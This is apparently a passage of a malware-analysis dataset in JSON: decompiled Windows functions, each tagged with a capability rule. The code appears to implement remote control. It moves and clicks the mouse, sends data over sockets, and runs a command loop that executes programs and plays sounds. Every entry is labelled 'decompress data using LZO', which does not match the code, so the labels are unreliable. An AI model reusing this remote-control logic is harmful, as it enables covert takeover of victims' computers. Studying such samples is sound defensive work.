= 0x47f062;\n    (****0x498990)();\n    uStack136 = 0x47f5c3;\n    uStack140 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff74;\n    uVar6 = 1;\n    uStack148 = 0x47f5a1;\n    uStack152 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff68;\n    puStack156 = 0x47f08c;\n    puStack132 = &stack0xfffffffc;\n    fcn.00405664();\n    puStack156 = &fcn.0047ef10::var_1fch;\n    puStack160 = 0x47f0a5;\n    fcn.00405964();\n    puStack160 = 0x47f0b5;\n    fcn.00405894();\n    if (uVar6) {\n        puStack160 = 0x47f0c9;\n        fcn.004059a4();\n        puStack160 = NULL;\n        puStack164 = 0x47f0d3;\n        puStack164 = fcn.00409e54();\n        puStack168 = NULL;\n        puStack172 = NULL;\n        puStack176 = 0x800;\n        puStack180 = 0x47f0e2;\n        sub.user32.dll_mouse_event();\n    }\n    else {\n        puStack160 = &fcn.0047ef10::var_200h;\n        puStack164 = 0x47f100;\n        fcn.00405964();\n        puStack164 = 0x47f110;\n        fcn.00405894();\n        if (uVar6) {\n            puStack164 = &fcn.0047ef10::var_18h;\n            puStack168 = 0x47f134;\n            fcn.00405964();\n            puStack168 = 0x47f13c;\n            fcn.00467ac0();\n            puStack168 = 0x47f144;\n            fcn.0040546c();\n        }\n        else {\n            puStack164 = &fcn.0047ef10::var_204h;\n            puStack168 = 0x47f162;\n            fcn.00405964();\n            puStack168 = 0x47f172;\n            fcn.00405894();\n            if (uVar6) {\n                puStack168 = 0x47f18a;\n                fcn.004059a4();\n                puStack168 = &fcn.0047ef10::var_8h;\n                puStack172 = 0x47f19b;\n                fcn.00405a48();\n                puStack172 = 0x47f1ab;\n                fcn.00405964();\n                puStack172 = 0x47f1b8;\n                fcn.00405a48();\n                puStack172 = 0x47f1c7;\n                fcn.004059a4();\n                puStack172 = &fcn.0047ef10::var_ch;\n                puStack176 = 0x47f1d8;\n                fcn.00405a48();\n                puStack176 = 0x47f1e8;\n                fcn.00405964();\n                puStack176 = 0x47f1f5;\n                fcn.00405a48();\n                puStack176 = 0x47f204;\n                fcn.004059a4();\n                puStack176 = &fcn.0047ef10::var_10h;\n                puStack180 = 0x47f215;\n                fcn.00405a48();\n                puStack180 = 0x47f225;\n                fcn.00405964();\n                puStack180 = 0x47f232;\n                fcn.00405a48();\n                puStack180 = 0x47f241;\n                fcn.004059a4();\n                puStack180 = 0x47f24c;\n                fcn.00405504();\n                puStack180 = 0x1;\n                puStack184 = 0x47f253;\n                iVar1 = sub.user32.dll_GetSystemMetrics();\n                puStack184 = 0x47f25d;\n                iVar2 = fcn.00409e54();\n                puStack184 = 0x47f268;\n                iVar3 = fcn.00409e54();\n                puStack184 = NULL;\n                iStack188 = 0x47f275;\n                iVar4 = sub.user32.dll_GetSystemMetrics();\n                iStack188 = 0x47f27f;\n                iVar5 = fcn.00409e54();\n                iStack188 = 0x47f28a;\n                iStack192 = fcn.00409e54();\n                iStack192 = (iVar4 * iVar5) / iStack192;\n                iStack196 = 0x47f297;\n                iStack188 = (iVar1 * iVar2) / iVar3;\n                sub.user32.dll_SetCursorPos();\n                iStack196 = 0;\n                iStack200 = 0;\n                uStack204 = 0;\n                uStack208 = 0;\n                uStack212 = 2;\n                uStack216 = 0x47f2a6;\n                sub.user32.dll_mouse_event();\n                uStack216 = 0;\n                uStack220 = 0;\n                uStack224 = 0;\n                uStack228 = 0;\n                uStack232 = 4;\n                uStack236 = 0x47f2b5;\n                sub.user32.dll_mouse_event();\n            }\n            else {\n                puStack168 = &fcn.0047ef10::var_208h;\n                puStack172 = 0x47f2d3;\n                fcn.00405964();\n                puStack172 = 0x47f2e3;\n                fcn.00405894();\n                if (uVar6) {\n                    puStack172 = 0x47f2fb;\n                    fcn.004059a4();\n                    puStack172 = &fcn.0047ef10::var_8h;\n                    puStack176 = 0x47f30c;\n                    fcn.00405a48();\n                    puStack176 = 0x47f31c;\n                    fcn.00405964();\n                    puStack176 = 0x47f329;\n                    fcn.00405a48();\n                    puStack176 = 0x47f338;\n                    fcn.004059a4();\n                    puStack176 = &fcn.0047ef10::var_ch;\n                    puStack180 = 0x47f349;\n                    fcn.00405a48();\n                    puStack180 = 0x47f359;\n                    fcn.00405964();\n                    puStack180 = 0x47f366;\n                    fcn.00405a48();\n                    puStack180 = 0x47f375;\n                    fcn.004059a4();\n                    puStack180 = &fcn.0047ef10::var_10h;\n                    puStack184 = 0x47f386;\n                    fcn.00405a48();\n                    puStack184 = 0x47f396;\n                    fcn.00405964();\n                    puStack184 = 0x47f3a3;\n                    fcn.00405a48();\n                    puStack184 = 0x47f3b2;\n                    fcn.004059a4();\n                    puStack184 = 0x47f3bd;\n                    fcn.00405504();\n                    puStack184 = 0x1;\n                    iStack188 = 0x47f3c4;\n                    iVar1 = sub.user32.dll_GetSystemMetrics();\n                    iStack188 = 0x47f3ce;\n                    iVar2 = fcn.00409e54();\n                    iStack188 = 0x47f3d9;\n                    iVar3 = fcn.00409e54();\n                    iStack188 = 0;\n                    iStack192 = 0x47f3e6;\n                    iVar4 = sub.user32.dll_GetSystemMetrics();\n                    iStack192 = 0x47f3f0;\n                    iVar5 = fcn.00409e54();\n                    iStack192 = 0x47f3fb;\n                    iStack196 = fcn.00409e54();\n                    iStack196 = (iVar4 * iVar5) / iStack196;\n                    iStack200 = 0x47f408;\n                    iStack192 = (iVar1 * iVar2) / iVar3;\n                    sub.user32.dll_SetCursorPos();\n                    iStack200 = 0;\n                    uStack204 = 0;\n                    uStack208 = 0;\n                    uStack212 = 0;\n                    uStack216 = 8;\n                    uStack220 = 0x47f417;\n                    sub.user32.dll_mouse_event();\n                    uStack220 = 0;\n                    uStack224 = 0;\n                    uStack228 = 0;\n                    uStack232 = 0;\n                    uStack236 = 0x10;\n                    uStack240 = 0x47f426;\n                    sub.user32.dll_mouse_event();\n                }\n                else {\n                    puStack172 = &fcn.0047ef10::var_20ch;\n                    puStack176 = 0x47f444;\n                    fcn.00405964();\n                    puStack176 = 0x47f454;\n                    fcn.00405894();\n                    if (uVar6) {\n                        puStack176 = 0x47f46c;\n                        fcn.004059a4();\n                        puStack176 = &fcn.0047ef10::var_8h;\n                        puStack180 = 0x47f47d;\n                        fcn.00405a48();\n                        puStack180 = 0x47f48d;\n                        fcn.00405964();\n                        puStack180 = 0x47f49a;\n                        fcn.00405a48();\n                        puStack180 = 0x47f4a9;\n                        fcn.004059a4();\n                        puStack180 = &fcn.0047ef10::var_ch;\n                        puStack184 = 0x47f4ba;\n                        fcn.00405a48();\n                        puStack184 = 0x47f4ca;\n                        fcn.00405964();\n                        puStack184 = 0x47f4d7;\n                        fcn.00405a48();\n                        puStack184 = 0x47f4e6;\n                        fcn.004059a4();\n                        puStack184 = &fcn.0047ef10::var_10h;\n                        iStack188 = 0x47f4f7;\n                        fcn.00405a48();\n                        iStack188 = 0x47f507;\n                        fcn.00405964();\n                        iStack188 = 0x47f514;\n                        fcn.00405a48();\n                        iStack188 = 0x47f523;\n                        fcn.004059a4();\n                        iStack188 = 0x47f52e;\n                        fcn.00405504();\n                        iStack188 = 1;\n                        iStack192 = 0x47f535;\n                        iVar1 = sub.user32.dll_GetSystemMetrics();\n                        iStack192 = 0x47f53f;\n                        iVar2 = fcn.00409e54();\n                        iStack192 = 0x47f54a;\n                        iVar3 = fcn.00409e54();\n                        iStack192 = 0;\n                        iStack196 = 0x47f557;\n                        iVar4 = sub.user32.dll_GetSystemMetrics();\n                        iStack196 = 0x47f561;\n                        iVar5 = fcn.00409e54();\n                        iStack196 = 0x47f56c;\n                        iStack200 = fcn.00409e54();\n                        iStack200 = (iVar4 * iVar5) / iStack200;\n                        uStack204 = 0x47f579;\n                        iStack196 = (iVar1 * iVar2) / iVar3;\n                        sub.user32.dll_SetCursorPos();\n                        uStack204 = 0;\n                        uStack208 = 0;\n                        uStack212 = 0;\n                        uStack216 = 0;\n                        uStack220 = 0x20;\n                        uStack224 = 0x47f588;\n                        sub.user32.dll_mouse_event();\n                        uStack224 = 0;\n                        uStack228 = 0;\n                        uStack232 = 0;\n                        uStack236 = 0;\n                        uStack240 = 0x40;\n                        uStack244 = 0x47f597;\n                        sub.user32.dll_mouse_event();\n                    }\n                }\n            }\n        }\n    }\n    *in_FS_OFFSET = uStack240;\n    *in_FS_OFFSET = uStack228;\n    uStack220 = 0x47f5ca;\n    uStack224 = 0x47f5c2;\n    fcn.0042e2f4();\n    return;\n}\n",
        "token_count": 4363
    },
    "0047fb34": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0047fb34(uint param_1)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    \n    fcn.00405b8c(param_1);\n    iVar2 = *in_EAX;\n    if (iVar2 != 0) {\n        iVar2 = *(iVar2 + -4);\n    }\n    uVar1 = fcn.004058fc();\n    sub.kernel32.dll_GetTempPathA(iVar2, uVar1);\n    fcn.00405b8c();\n    return;\n}\n",
        "token_count": 128
    },
    "0047fd84": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0047fd84(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint32_t *in_FS_OFFSET;\n    uchar uVar4;\n    bool bVar5;\n    float10 fVar6;\n    ulong uVar7;\n    uint32_t in_stack_ffffff24;\n    uint32_t in_stack_ffffff30;\n    int32_t iVar8;\n    uint32_t uStack196;\n    uint uStack192;\n    uchar *puStack188;\n    uint uStack184;\n    uint uStack180;\n    uint uStack176;\n    uint uStack172;\n    uint uStack168;\n    uint uStack164;\n    uint uStack160;\n    uchar *puStack156;\n    uint uStack152;\n    uint uStack148;\n    uint uStack144;\n    uint uStack140;\n    uint uStack136;\n    uint uStack132;\n    uint uStack128;\n    uint uStack124;\n    uint uStack120;\n    uint uStack116;\n    uint uStack112;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint32_t var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint32_t uStack36;\n    uint var_1ch;\n    uchar *var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = 0xb;\n    do {\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    var_18h = 0x47fda1;\n    var_14h = unaff_EDI;\n    var_10h = unaff_ESI;\n    fcn.004058ec();\n    var_1ch = 0x4800f3;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    _var_28h = CONCAT44(&stack0xfffffffc, 0x4800b7);\n    var_2ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0047fd84::var_2ch;\n    uVar4 = **0x4926d8 == 1;\n    if (!uVar4) {\n        _var_30h = var_2ch << 0x20;\n        _var_38h = CONCAT44(0x47fdce, var_38h);\n        var_18h = &stack0xfffffffc;\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread();\n    }\n    var_30h = 0x47fdd6;\n    var_18h = &stack0xfffffffc;\n    fcn.0047f9f4();\n    _var_30h = CONCAT44(var_2ch, 0x47fde4);\n    fcn.00405894();\n    if (uVar4) goto code_r0x0048008f;\n    var_30h = 0x47fdf2;\n    fcn.0047fb34();\n    var_30h = 0x47fdff;\n    fcn.00405738();\n    var_30h = 0x47fe07;\n    cVar1 = fcn.0040a1e4();\n    uVar4 = cVar1 == '\\0';\n    if (uVar4) {\n        var_30h = 0x47fe26;\n        fcn.004034f4();\n        _var_30h = CONCAT44(var_2ch, 0x47fe2b);\n        fcn.0040304c();\n    }\n    else {\n        var_30h = 0x47fe15;\n        fcn.00403500();\n        _var_30h = CONCAT44(var_2ch, 0x47fe1a);\n        fcn.0040304c();\n    }\n    var_30h = 0x47fe3b;\n    fcn.00405bf0();\n    var_30h = 0x47fe40;\n    fcn.0040409c();\n    var_30h = 0x47fe45;\n    fcn.0040304c();\n    var_30h = 0x47fe4a;\n    fVar6 = fcn.0040bc38();\n    _var_28h = fVar6;\n    var_24h = _var_28h >> 0x20;\n    _var_30h = CONCAT44(var_2ch, var_24h);\n    var_34h = SUB84(_var_28h, 0);\n    var_38h = 0x47fe64;\n    fcn.0040c86c();\n    var_38h = 0x47fe69;\n    fVar6 = fcn.0040bc0c();\n    _var_30h = fVar6;\n    var_2ch = _var_30h >> 0x20;\n    _var_38h = CONCAT44(var_34h, var_2ch);\n    var_3ch = SUB84(_var_30h, 0);\n    var_40h = 0x47fe83;\n    fcn.0040c86c();\n    _var_40h = CONCAT44(var_3ch, 0x480120);\n    var_44h = *0x49254c;\n    var_48h = 0x480138;\n    var_4ch = 0x480144;\n    var_50h = 0x480150;\n    var_54h = var_10h;\n    var_58h = 0x480160;\n    uStack96 = var_14h;\n    uStack100 = 0x480144;\n    uStack104 = *0x492554;\n    uStack108 = 0x480144;\n    uStack112 = *0x492560;\n    uStack116 = 0x480144;\n    uStack120 = 0x47fed0;\n    fcn.00405800();\n    uStack120 = 0x47fedd;\n    fcn.00405bf0();\n    uStack120 = 0x47fee2;\n    fcn.0040409c();\n    uStack120 = 0x47fee7;\n    fcn.0040304c();\n    uStack120 = 0x47feef;\n    fcn.0047fb74();\n    uStack120 = 0x47fefd;\n    fcn.00405894();\n    if (!uVar4) {\n        uStack120 = 0x47ff13;\n        fcn.00405bf0();\n        uStack120 = 0x47ff18;\n        fcn.0040409c();\n        uStack120 = 0x47ff1d;\n        fcn.0040304c();\n        var_4ch = *0x49255c;\n        uStack120 = 0x47ff36;\n        fVar6 = fcn.0040bc38();\n        _var_38h = fVar6;\n        var_34h = _var_38h >> 0x20;\n        uStack120 = var_34h;\n        uStack124 = var_38h;\n        uStack128 = 0x47ff50;\n        fcn.0040c86c();\n        uStack128 = 0x47ff55;\n        fVar6 = fcn.0040bc0c();\n        _var_40h = fVar6;\n        var_3ch = _var_40h >> 0x20;\n        uStack128 = var_3ch;\n        uStack132 = var_40h;\n        uStack136 = 0x47ff6f;\n        fcn.0040c86c();\n        uStack136 = 0x480170;\n        uStack140 = 0x47ff7e;\n        fcn.00409ce8();\n        uStack140 = var_54h;\n        uStack144 = 0x480198;\n        uStack148 = 0x480144;\n        uStack152 = 0x480150;\n        puStack156 = var_18h;\n        uStack160 = 0x480160;\n        uStack164 = var_1ch;\n        uStack168 = 0x480144;\n        uStack172 = *0x49255c;\n        uStack176 = 0x480144;\n        uStack180 = *0x492560;\n        uStack184 = 0x480144;\n        puStack188 = 0x47ffc3;\n        fcn.00405800();\n        puStack188 = 0x47ffd0;\n        fcn.00405bf0();\n        puStack188 = 0x47ffd5;\n        fcn.0040409c();\n        puStack188 = 0x47ffda;\n        fcn.0040304c();\n        puStack188 = 0x47ffe7;\n        fcn.004054c0();\n        bVar5 = true;\n        uStack192 = 0x48006c;\n        uStack196 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff3c;\n        puStack188 = &stack0xfffffffc;\n        fcn.00405894();\n        if (bVar5) {\n            fcn.0047fb34();\n            fcn.00405738();\n            uVar7 = fcn.0047fa70();\n            in_stack_ffffff30 = 0x480033;\n            iVar2 = fcn.00409e54();\n            iVar8 = uVar7 >> 0x20;\n            iVar3 = (iVar2 << 10) >> 0x1f;\n            if (iVar3 == iVar8) {\n                if (iVar2 << 10 < uVar7) {\ncode_r0x0048004a:\n                    in_stack_ffffff30 = 0;\n                    in_stack_ffffff24 = 0;\n                    sub.kernel32.dll_CreateThread(0, 0, fcn.0047fb98, 0, 0, *0x492a34);\n                }\n            }\n            else if (iVar3 < iVar8) goto code_r0x0048004a;\n        }\n        *in_FS_OFFSET = in_stack_ffffff24;\n    }\n    fcn.0040390c();\n    fcn.0040304c();\n    fcn.0040546c();\ncode_r0x0048008f:\n    fcn.00405738();\n    *in_FS_OFFSET = in_stack_ffffff30;\n    fcn.004054c0(0x4800be);\n    return;\n}\n",
        "token_count": 2503
    },
    "00480b8c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00480b8c noreturn (uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack1484;\n    uint uStack1480;\n    uchar *puStack1476;\n    uint var_5b4h;\n    uint var_5b0h;\n    uint var_1b0h;\n    uint var_1ach;\n    uint var_1a0h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack1476 = &stack0xfffffffc;\n    var_5b4h = 0;\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    uStack1480 = 0x480cfb;\n    uStack1484 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack1484;\n    fcn.00405664();\n    fcn.00405a48(&var_5b4h);\n    fcn.00405964();\n    var_10h = fcn.004058fc();\n    fcn.00405a48();\n    fcn.004059a4();\n    uVar1 = fcn.00409e54();\n    fcn.00480ab0();\n    iVar2 = sub.wsock32.dll_WSAStartup(2, &var_1a0h);\n    if (iVar2 != 0) {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread(0);\n    }\n    iVar2 = sub.wsock32.dll_socket(2, 2, 0);\n    if (iVar2 < 0) {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread(0);\n    }\n    fcn.00403aac();\n    var_1b0h._0_2_ = 2;\n    uVar3 = fcn.00489450();\n    var_1ach = sub.wsock32.dll_inet_addr(uVar3);\n    var_1b0h._2_2_ = sub.wsock32.dll_htons(uVar1);\n    iVar4 = var_4h;\n    if (var_4h != 0) {\n        iVar4 = *(var_4h + -4);\n    }\n    sub.wsock32.dll_sendto(iVar2, &var_4h, iVar4, 0, &var_1b0h, 0x10);\n    fcn.00405664();\n    sub.kernel32.dll_Sleep_1(1000);\n    sub.wsock32.dll_closesocket(iVar2);\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread(0);\n}\n",
        "token_count": 644
    },
    "00480e84": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00480e84(uint param_1, int32_t param_2)\n\n{\n    uint in_EAX;\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack1056;\n    uint uStack1052;\n    uchar *puStack1048;\n    uint buf;\n    uint s;\n    int32_t var_4h;\n    \n    puStack1048 = 0x480e9d;\n    s = in_EAX;\n    var_4h = param_2;\n    fcn.004058ec();\n    uStack1052 = 0x480f16;\n    uStack1056 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffbe0;\n    puStack1048 = &stack0xfffffffc;\n    fcn.00403aac();\n    iVar2 = var_4h;\n    if (var_4h != 0) {\n        iVar2 = *(var_4h + -4);\n    }\n    if (-1 < iVar2 + -1) {\n        iVar3 = 0;\n        puVar1 = &fcn.00480e84::buf;\n        do {\n            *puVar1 = *(var_4h + iVar3);\n            iVar3 = iVar3 + 1;\n            puVar1 = puVar1 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    sub.wsock32.dll_send(s, &fcn.00480e84::buf, 0x400, 0);\n    *in_FS_OFFSET = s;\n    fcn.0040546c(0x480f1d);\n    return;\n}\n",
        "token_count": 381
    },
    "00482120": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00482120(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    uchar uVar1;\n    int32_t iStack300;\n    uint uStack296;\n    uchar *puStack292;\n    uint var_114h;\n    uint pszPath;\n    uint pidl;\n    int32_t var_4h;\n    \n    puStack292 = &stack0xfffffffc;\n    var_114h = 0;\n    var_4h = 0;\n    uStack296 = 0x4821e0;\n    iStack300 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack300;\n    sub.shell32.dll_SHGetSpecialFolderLocation(0);\n    sub.shell32.dll_SHGetPathFromIDListA(pidl, &pszPath);\n    fcn.0040aa8c();\n    uVar1 = var_4h == 0 || var_4h == 4;\n    fcn.00405964();\n    fcn.00405894();\n    if (uVar1) {\n        fcn.004054c0();\n    }\n    else {\n        fcn.00405784();\n    }\n    *in_FS_OFFSET = &var_114h;\n    fcn.0040546c(0x4821e7);\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 289
    },
    "004821fc": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.004821fc(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uchar uVar3;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack28 = 0x4822ab;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack32;\n    fcn.00405b8c();\n    iVar2 = var_4h;\n    if (var_4h != 0) {\n        iVar2 = *(var_4h + -4);\n    }\n    uVar1 = fcn.004058fc();\n    sub.kernel32.dll_GetTempPathA(iVar2, uVar1);\n    fcn.00405b8c();\n    uVar3 = var_4h == 0 || var_4h == 4;\n    fcn.00405964();\n    fcn.00405894();\n    if (uVar3) {\n        fcn.004054c0();\n    }\n    else {\n        fcn.00405784();\n    }\n    *in_FS_OFFSET = &var_8h;\n    fcn.00405490(0x4822b2);\n    return;\n}\n",
        "token_count": 324
    },
    "004822c4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.004822c4(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uchar uVar3;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack28 = 0x482373;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack32;\n    fcn.00405b8c();\n    iVar2 = var_4h;\n    if (var_4h != 0) {\n        iVar2 = *(var_4h + -4);\n    }\n    uVar1 = fcn.004058fc(iVar2);\n    sub.kernel32.dll_GetSystemDirectoryA(uVar1);\n    fcn.00405b8c();\n    uVar3 = var_4h == 0 || var_4h == 4;\n    fcn.00405964();\n    fcn.00405894();\n    if (uVar3) {\n        fcn.004054c0();\n    }\n    else {\n        fcn.00405784();\n    }\n    *in_FS_OFFSET = &var_8h;\n    fcn.00405490(0x48237a);\n    return;\n}\n",
        "token_count": 322
    },
    "0048238c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0048238c(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uchar uVar3;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack28 = 0x48243b;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack32;\n    fcn.00405b8c();\n    iVar2 = var_4h;\n    if (var_4h != 0) {\n        iVar2 = *(var_4h + -4);\n    }\n    uVar1 = fcn.004058fc(iVar2);\n    sub.kernel32.dll_GetWindowsDirectoryA(uVar1);\n    fcn.00405b8c();\n    uVar3 = var_4h == 0 || var_4h == 4;\n    fcn.00405964();\n    fcn.00405894();\n    if (uVar3) {\n        fcn.004054c0();\n    }\n    else {\n        fcn.00405784();\n    }\n    *in_FS_OFFSET = &var_8h;\n    fcn.00405490(0x482442);\n    return;\n}\n",
        "token_count": 322
    },
    "004826c0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.004826c0(void)\n\n{\n    int32_t in_EAX;\n    int32_t *in_FS_OFFSET;\n    uchar uVar1;\n    int32_t in_stack_ffffffbc;\n    int32_t iStack52;\n    uint uStack48;\n    uchar *puStack44;\n    int32_t iStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    var_8h = 0;\n    var_ch = 0;\n    puStack32 = 0x4826d7;\n    var_4h = in_EAX;\n    fcn.004058ec();\n    uStack36 = 0x4827c7;\n    iStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    uStack48 = 0x4827a2;\n    iStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack32 = &stack0xfffffffc;\n    fcn.00420f7c();\n    fcn.00421014();\n    fcn.00421158();\n    fcn.004218dc();\n    uVar1 = var_8h == 0 || var_8h == 4;\n    fcn.00405964();\n    fcn.00405894();\n    if (uVar1) {\n        fcn.00405738();\n        var_4h = in_stack_ffffffbc;\n    }\n    else {\n        fcn.00405800(var_4h, 0x482834, var_8h);\n    }\n    fcn.0042187c();\n    fcn.00404640();\n    *in_FS_OFFSET = var_4h;\n    *in_FS_OFFSET = &fcn.004826c0::var_ch;\n    uStack48 = 0x4827ce;\n    iStack52 = 0x4827c6;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 462
    },
    "00487540": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __cdecl fcn.00487540 noreturn (uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uchar uVar2;\n    uint var_3ch;\n    uint var_34h;\n    uint var_2ch;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    iVar1 = 0x671;\n    do {\n        var_4h = 0;\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    var_18h = 0x487563;\n    fcn.00405f08();\n    uStack32 = 0x487b9f;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uStack44 = 0x487b27;\n    var_2ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00487540::var_2ch;\n    var_18h = &stack0xfffffffc;\n    fcn.0040858c();\n    fcn.00405504();\n    fcn.00405504();\n    fcn.00405504();\n    fcn.00405504();\n    fcn.00405504();\n    fcn.00405504();\n    iVar1 = sub.wsock32.dll_WSAStartup();\n    if (iVar1 != 0) {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread();\n    }\n    iVar1 = sub.wsock32.dll_socket();\n    if (iVar1 == -1) {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread();\n    }\n    sub.wsock32.dll_htons();\n    fcn.00489450();\n    sub.wsock32.dll_inet_addr();\n    sub.wsock32.dll_connect();\n    sub.wsock32.dll_recv();\n    fcn.00405800();\n    fcn.00472bec();\n    sub.wsock32.dll_recv();\n    fcn.00403aac();\n    fcn.0040a604();\n    fcn.00405784();\n    fcn.00403764();\n    **0x4929d8 = 1;\n    fcn.00403e3c();\n    fcn.0040304c();\n    while( true ) {\n        fcn.00403aac();\n        iVar1 = sub.wsock32.dll_recv();\n        uVar2 = iVar1 == 0;\n        if (iVar1 < 1) break;\n        fcn.004038ec(0);\n        fcn.0040304c();\n        fcn.0040595c();\n        sub.wsock32.dll_send();\n    }\n    fcn.0040390c();\n    fcn.0040304c();\n    sub.wsock32.dll_closesocket();\n    sub.wsock32.dll_WSACleanup();\n    fcn.00405894();\n    if (uVar2) {\n        fcn.00463d78();\n        fcn.00405738();\n        fcn.004058fc();\n        sub.shell32.dll_ShellExecuteA();\n    }\n    fcn.00405894();\n    if (uVar2) {\n        fcn.00463d78();\n        fcn.00405738();\n        fcn.004058fc();\n        sub.shell32.dll_ShellExecuteA();\n    }\n    fcn.00405894();\n    if (uVar2) {\n        fcn.00463d78();\n        fcn.00405738();\n        fcn.004058fc();\n        sub.shell32.dll_ShellExecuteA();\n    }\n    fcn.00405894();\n    if (uVar2) {\n        fcn.00463d78();\n        fcn.00405738();\n        fcn.004058fc();\n        sub.shell32.dll_ShellExecuteA();\n    }\n    fcn.00405894();\n    if (uVar2) {\n        fcn.0040a604();\n        fcn.00405784();\n        fcn.004058fc();\n        sub.shell32.dll_ShellExecuteA();\n        uVar2 = 1;\n        fcn.00472134();\n    }\n    fcn.00405894();\n    if (uVar2) {\n        fcn.00463d78();\n        fcn.00405738();\n        fcn.004058fc();\n        sub.winmm.dll_PlaySoundA();\n    }\n    fcn.00405894();\n    if (uVar2) {\n        fcn.00463d78();\n        fcn.00405738();\n        